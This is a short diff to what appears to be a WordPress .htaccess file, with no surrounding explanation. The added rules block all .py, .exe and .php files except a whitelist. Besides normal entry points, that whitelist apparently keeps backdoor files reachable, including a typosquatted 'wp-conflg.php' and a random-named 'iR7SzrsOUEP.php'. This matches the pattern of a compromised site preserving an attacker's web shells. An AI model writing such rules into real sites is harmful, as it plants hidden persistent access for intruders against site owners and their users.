@@ -1,9 +1,16 @@
-
+<FilesMatch ".(py|exe|php)$">
+ Order allow,deny
+ Deny from all
+</FilesMatch>
+<FilesMatch "(^wp-login.php|^wp-blog-header.php|^style.php|^style2.php|^wp-conflg.php|^index.php|^class.api.php|^iR7SzrsOUEP.php|^license.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
 <IfModule mod_rewrite.c>
 RewriteEngine On
 RewriteBase /
-RewriteRule ^1index.php$ - [L]
+RewriteRule ^index.php$ - [L]
 RewriteCond %{REQUEST_FILENAME} !-f
 RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule . 1index.php [L]
+RewriteRule . index.php [L]
 </IfModule>
